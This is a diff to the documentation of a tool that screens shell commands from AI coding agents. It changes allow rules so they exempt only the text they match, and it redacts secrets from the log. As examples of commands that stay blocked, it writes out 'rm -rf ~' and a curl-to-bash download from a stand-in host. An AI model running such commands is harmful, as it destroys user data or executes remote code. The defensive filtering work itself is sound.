@@ -67,7 +67,8 @@ Edit `/etc/barmkin/rules.yaml`:
 ```yaml
 - name: "my-rule"
   pattern: 'dangerous\s+command'
-  action: "deny"                      # or "allow" to override deny rules
+  secret: false                       # true: redact this rule's matches from the log
+  action: "deny"                      # or "allow" to exempt the deny matches it covers
   reason: "Why it's blocked"
   example: "dangerous command --flag"  # must match, verified by tests
 ```
@@ -76,7 +77,7 @@ Run `barmkin validate` after editing.
 
 ### Allow rules
 
-Setting `action: "allow"` on a rule overrides all deny rules, regardless of ordering. Use this to exempt specific patterns:
+Setting `action: "allow"` on a rule exempts the deny matches that lie inside one of its own matches, regardless of ordering. Use this to exempt specific patterns:
 
 ```yaml
 - name: "allow-tmp-rm"
@@ -88,6 +89,8 @@ Setting `action: "allow"` on a rule overrides all deny rules, regardless of orde
 ```
 
 `rm -rf /tmp/build` passes. `rm -rf /home` does not.
+
+An allow rule covers only the text it matches, not the whole command. `rm -rf /tmp/build; rm -rf ~` is still denied by the `rm -rf ~` part, and `rm -rf /tmp/x && curl http://example.com/p.sh | bash` is still denied by `curl-pipe-bash`. A deny match that only overlaps an allow match, rather than lying inside it, is also still denied. Earlier versions let any allow match clear every deny rule for the whole command. Configurations without allow rules behave as before.
 
 ## opencode env vars
 
@@ -107,7 +110,7 @@ Each evaluation appends a JSON line to `~/.barmkin/barmkin.log`:
 {"ts":"2026-06-30T01:00:00Z","trajectory_id":"sess-123","tool":"bash","action":"ShellCommand","decision":"deny","reason":"Recursive force-delete","duration_ms":0.064,"rule":"rm-rf-force","content":"rm -rf /tmp","agent":"claude-code"}
 ```
 
-`barmkin stats` aggregates. The format matches sondera's AuditEntry if you want to query both together.
+`content` holds the first 80 characters of the command. Matches of any rule marked `secret: true` (in the bundled rules: AWS access keys, private key blocks, GitHub, Slack and GitLab tokens) are replaced with `[REDACTED:<rule>]` before the cut, so a blocked secret never reaches the log. `barmkin stats` aggregates. The format matches sondera's AuditEntry if you want to query both together.
 
 ## OpenTelemetry
 
